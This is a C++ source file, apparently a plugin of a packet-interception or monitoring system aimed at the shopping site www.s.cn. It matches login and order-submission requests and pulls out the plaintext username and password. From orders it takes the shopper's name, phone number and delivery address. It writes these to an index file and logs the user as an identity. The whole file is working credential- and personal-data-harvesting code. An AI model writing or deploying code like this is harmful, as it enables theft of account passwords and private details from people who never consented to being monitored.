
#include "StdAfx.h"

#include "ShoppingMingXieKu.h"

shopping::MingXieKu::MingXieKu(HttpSession *http_session, const string &pro_name) : Shopping(http_session, pro_name)
{
	
}

shopping::MingXieKu::~MingXieKu()
{
	
}

int shopping::MingXieKu::IsMingXieKu(HttpSession *http_session)
{
	
	if((http_session->m_Requestline.m_Host.Find("www.s.cn")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/order-create")!=-1))
	{
		return kPCWebOrderSubmit;
	}

	if((http_session->m_Requestline.m_Host.Find("www.s.cn")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/passport")!=-1))
	{
		return kPCLogin;
	}

	return 0;
}

int shopping::MingXieKu::Process(const char *packet,int action)
{
	
	if (action == kPCWebOrderSubmit)
	{
		return PCWebOrderSubmit(packet);
	}
	if (action == kPCLogin)
	{
		return PCLogin(packet);
	}
	return 0;
}

int shopping::MingXieKu::PCWebOrderSubmit(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UrlDecode(src_data);
	ms_->SplitStringToMap(src_data,'&','=');
	//电话
	phone_=ms_->GetValueFromMapByKey("delivery[ship_mobile]",true);
	//姓名
	name_=ms_->GetValueFromMapByKey("delivery[ship_name]",true);
	//地址
	string address,ship_addr_area,ship_addr;
	ship_addr_area=ms_->GetValueFromMapByKey("delivery[ship_addr_area]",true);
	ship_addr=ms_->GetValueFromMapByKey("delivery[ship_addr]",true);
	address_= ship_addr_area + ship_addr;
	if ( name_.empty() || phone_.empty() || address_.empty())
	{
		return 0;
	}	
	output_text_ =  
		"nick=" + name_ + "\r\n" + 
		"oid=" + phone_ + "\r\n" + 
		"msg=" + address_ + "\r\n" + 
		"state=提交订单\r\n";
	WriteIndexFile();
	return 1;
}

int shopping::MingXieKu::PCLogin(const char *packet)
{
	string src_data(packet);
	ms_->SplitStringToMap(src_data,'&','=');
	
	string user,pass;
	user = ms_->GetValueFromMapByKey("login",true);
	pass = ms_->GetValueFromMapByKey("passwd");
	
	if ( user.empty() || pass.empty())
	{
		return 0;
	}
	WriteVirtualIdentity(user,"上线");
	
	output_text_ = 
		"user=" + user + "\r\n" + 
		"pass=" + pass + "\r\n" + 
		"state=登录\r\n";	
	WriteIndexFile();
	return 1;

}


